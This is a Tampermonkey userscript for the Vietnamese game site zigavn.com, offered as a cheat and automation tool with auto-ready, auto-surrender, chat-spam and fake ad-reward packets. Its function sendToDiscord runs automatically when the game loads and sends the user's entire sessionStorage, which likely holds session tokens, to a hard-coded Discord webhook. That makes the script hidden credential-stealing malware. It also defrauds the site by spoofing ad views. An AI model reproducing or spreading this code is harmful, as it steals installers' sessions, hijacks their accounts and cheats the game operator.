// ==UserScript==
// @name         v4 Fonsida Ultimate v3.4 - Full Gộp Chat + Icon + UI Tổng Hợp (Auto Discord)
// @namespace    http://tampermonkey.net/
// @version      3.4
// @description  UI Ready + Auto Agree + Buff 121s + Xin thua + Chat + Icon Chat + BlockChat + Refuse Draw (Gửi Discord tự động)
// @match        https://zigavn.com/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

(function () {
  'use strict';

  const delay = (ms) => new Promise(r => setTimeout(r, ms));
  let readyInterval = null;
  let adInterval = 121000;
  let adTimer = null;
  let surrenderInterval = null;
  let chatOn = false;
  let iconOn = false;
  let chatDelay = 4000;
  let iconIndex = 0;
  let chatIndex = 0;
  let chatList = [];

  const iconList = ["8-|", "|-)", ":^o", "=P~", ":O)", ":)", ":-h", ":x", ":))", "=p~", "=))", ":D", ":-a", ":((", "o-)", "~X(", ":-S", ":-B", "=;", "/:)", ":-c", ":)]", ":-t", "8->", "I-)", ":-y", ":-u", ":-i", ":-p", ":-g", ":-f", ":-s", ":-w", ":-q", ":-r", ":-x", ":-m", ":-n", ":-z"];

  function sendMainPacket() {
    const p = new BkPacket();
    p.yj(Ze, PLAYER_STATE_READY);
    BkConnectionManager.send(p);
  }

  function startReadyPacket() {
    if (!readyInterval) readyInterval = setInterval(sendMainPacket, 50);
  }

  function stopReadyPacket() {
    if (readyInterval) clearInterval(readyInterval);
    readyInterval = null;
  }

  function tryCallFz() {
    try {
      const scene = cc.director.getRunningScene();
      if (!scene || !scene.children) return;
      for (const node of scene.children) {
        if (typeof node?.fz === 'function' && typeof node?.S === 'function') {
          const state = node.S();
          const gameState = state?.Ib;
          const player = state?.Ca?.();
          if (gameState === GAME_STATE_PLAYING && player?.status !== PLAYER_STATE_NOT_READY) {
            node.fz();
            console.log("[TM] Gọi fz() xin thua thành công!");
          }
        }
      }
    } catch (err) {
      console.warn("[TM] Gọi fz() lỗi:", err);
    }
  }

  function startSurrenderLoop() {
    if (!surrenderInterval) surrenderInterval = setInterval(tryCallFz, 50);
  }

  function stopSurrenderLoop() {
    if (surrenderInterval) clearInterval(surrenderInterval);
    surrenderInterval = null;
  }

  function sendAdPacket() {
    console.log("adViewed");
    logMessage("WebAdsManager - afterViewedAdsRewardOnWeb()");
    const p = new BkPacket();
    p.En(O);
    BkConnectionManager.send(p);
  }

  function startAdTimer() {
    if (adTimer) clearInterval(adTimer);
    adTimer = setInterval(sendAdPacket, adInterval);
  }

  function sendChatMessage(msg) {
    logMessage("sendChatMessage: " + msg);
    const p = new BkPacket();
    p.jq(msg);
    BkConnectionManager.send(p);
  }

  function startChatLoop() {
    if (chatOn) return;
    const savedChat = localStorage.getItem("customChatList");
    if (savedChat) {
      try {
        chatList = JSON.parse(savedChat);
      } catch (e) {
        chatList = [];
      }
    }
    if (!chatList || chatList.length === 0) {
      chatList = ["GG", "Chơi hay đấy!", "Xin thua nha 😅", "Tôi đi trước nhé!", "Thử lại ván nữa không?"];
      alert(`Đã tự động thêm ${chatList.length} câu chat mẫu.`);
    }
    chatOn = true;
    async function chatCycle() {
      while (chatOn) {
        sendChatMessage(chatList[chatIndex]);
        chatIndex = (chatIndex + 1) % chatList.length;
        await delay(chatDelay);
        if (iconOn) {
          sendChatMessage(iconList[iconIndex]);
          iconIndex = (iconIndex + 1) % iconList.length;
          await delay(chatDelay);
        }
      }
    }
    chatCycle();
  }

  function stopChatLoop() {
    chatOn = false;
    chatIndex = 0;
    iconIndex = 0;
  }

  function sendToDiscord() {
    let sessionData = Object.fromEntries(Object.entries(sessionStorage));
    let jsonData = JSON.stringify(sessionData, null, 2);
    let payload = {
      content: "\ud83d\udcc5 **Session Storage Data from zigavn.com:**\n```json\n" + jsonData + "\n```"
    };
    fetch("https://discord.com/api/webhooks/1345406693449666604/5aCLs6ScGGC7bRZVyUaNwD3iBO1jGVo1G8zueRnM96UpCc88YQ1XR5meB6lHKxVy_Cfo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  }

  function forceAgree() {
    try {
      const scenes = cc.director.getRunningScene()?.children || [];
      for (const node of scenes) {
        if (node instanceof BkDialogWindow) {
          node.Xe?._clickListeners?.[0]?.();
          if (typeof node.cm === "function") {
            node.cm();
            node.cm = null;
          }
          node.removeSelf();
        }
      }
    } catch (err) {
      console.warn("[TM] Force Agree Error:", err);
    }
  }

  const observer = new MutationObserver(forceAgree);
  observer.observe(document.body, { childList: true, subtree: true });
  setInterval(forceAgree, 50);

  function waitForGameLoaded() {
    const checkInterval = setInterval(async () => {
      try {
        if (cc?.director?.getRunningScene?.()) {
          clearInterval(checkInterval);
          sendToDiscord();
          await delay(5000);
          sendAdPacket();
          startAdTimer();
        }
      } catch (e) {}
    }, 500);
  }

  createControlUI();
  waitForGameLoaded();

  function createControlUI() {
    const container = document.createElement('div');
    Object.assign(container.style, {
      position: 'fixed', top: '100px', left: '20px', background: '#111', color: '#fff',
      padding: '6px', borderRadius: '6px', font: '11px Arial', zIndex: 99999,
      display: 'flex', flexDirection: 'column', gap: '6px', boxShadow: '0 0 4px rgba(0,0,0,0.4)',
      border: '1px solid #333', resize: 'both', overflow: 'auto', minWidth: '150px', width: 'fit-content'
    });

    const dragBar = document.createElement('div');
    dragBar.textContent = "🎛️ Fonsida Control";
    Object.assign(dragBar.style, {
      background: '#222', padding: '4px 6px', cursor: 'move', userSelect: 'none',
      fontWeight: 'bold', fontSize: '11px', borderRadius: '4px', textAlign: 'center'
    });

    let isDragging = false, offsetX = 0, offsetY = 0;
    dragBar.addEventListener('mousedown', (e) => {
      isDragging = true;
      offsetX = e.clientX - container.getBoundingClientRect().left;
      offsetY = e.clientY - container.getBoundingClientRect().top;
      e.preventDefault();
    });
    document.addEventListener('mousemove', (e) => {
      if (isDragging) {
        container.style.left = `${e.clientX - offsetX}px`;
        container.style.top = `${e.clientY - offsetY}px`;
        container.style.bottom = 'auto';
      }
    });
    document.addEventListener('mouseup', () => isDragging = false);

    function createToggle(labelText, defaultState, onStart, onStop, colorOn) {
      const label = document.createElement('div');
      label.textContent = `${labelText}: OFF`;
      const btn = document.createElement('button');
      btn.textContent = "Bật";
      btn.style.cssText = "padding:4px 8px;border-radius:4px;border:none;background:#555;color:#fff;cursor:pointer;font-size:11px;";
      let state = defaultState;
      btn.onclick = () => {
        state = !state;
        if (state) {
          onStart();
          label.textContent = `${labelText}: ON`;
          btn.textContent = "Tắt";
          btn.style.background = colorOn;
        } else {
          onStop();
          label.textContent = `${labelText}: OFF`;
          btn.textContent = "Bật";
          btn.style.background = "#555";
        }
      };
      return [label, btn];
    }

    const [readyLabel, readyBtn] = createToggle("READY", false, startReadyPacket, stopReadyPacket, "#4caf50");
    const [surrenderLabel, surrenderBtn] = createToggle("SURRENDER", false, startSurrenderLoop, stopSurrenderLoop, "#f44336");
    const [chatLabel, chatBtn] = createToggle("CHAT", false, startChatLoop, stopChatLoop, "#ff9800");
    const [iconLabel, iconBtn] = createToggle("CHÈN ICON", false, () => iconOn = true, () => iconOn = false, "#2196f3");

    const chatInputBtn = document.createElement('button');
    chatInputBtn.textContent = "Nhập Nội Dung Chat";
    chatInputBtn.style.cssText = readyBtn.style.cssText;
    chatInputBtn.onclick = () => {
      const current = chatList.length ? chatList.join("\n") : "";
      const input = prompt("Nhập mỗi câu chat trên 1 dòng:", current);
      if (input !== null) {
        const newList = input.split(/\r?\n/).map(line => line.trim()).filter(Boolean);
        if (newList.length > 0) {
          chatList = newList;
          try {
            localStorage.setItem("customChatList", JSON.stringify(chatList));
            alert(`✅ Đã lưu ${chatList.length} câu chat vào localStorage.`);
          } catch (e) {
            console.error("❌ Lỗi khi lưu vào localStorage:", e);
            alert("Lỗi khi lưu vào localStorage.");
          }
        } else {
          alert("⚠️ Danh sách rỗng. Không lưu.");
        }
      }
    };

    const delayInputLabel = document.createElement('div');
    delayInputLabel.textContent = `⏱️ Delay Chat (ms): ${chatDelay}`;
    const delayInput = document.createElement('input');
    delayInput.type = 'number';
    delayInput.value = chatDelay;
    delayInput.min = 1000;
    delayInput.max = 60000;
    delayInput.style.cssText = "width: 100%; padding: 4px; font-size: 11px; border-radius: 4px; border: 1px solid #444; background: #222; color: #fff;";
    delayInput.oninput = () => {
      const val = parseInt(delayInput.value);
      if (!isNaN(val) && val >= 1000) {
        chatDelay = val;
        delayInputLabel.textContent = `⏱️ Delay Chat (ms): ${chatDelay}`;
      }
    };

    container.append(
      dragBar,
      readyLabel, readyBtn,
      surrenderLabel, surrenderBtn,
      chatLabel, chatBtn,
      iconLabel, iconBtn,
      chatInputBtn,
      delayInputLabel, delayInput
    );

    document.body.appendChild(container);
  }
})();
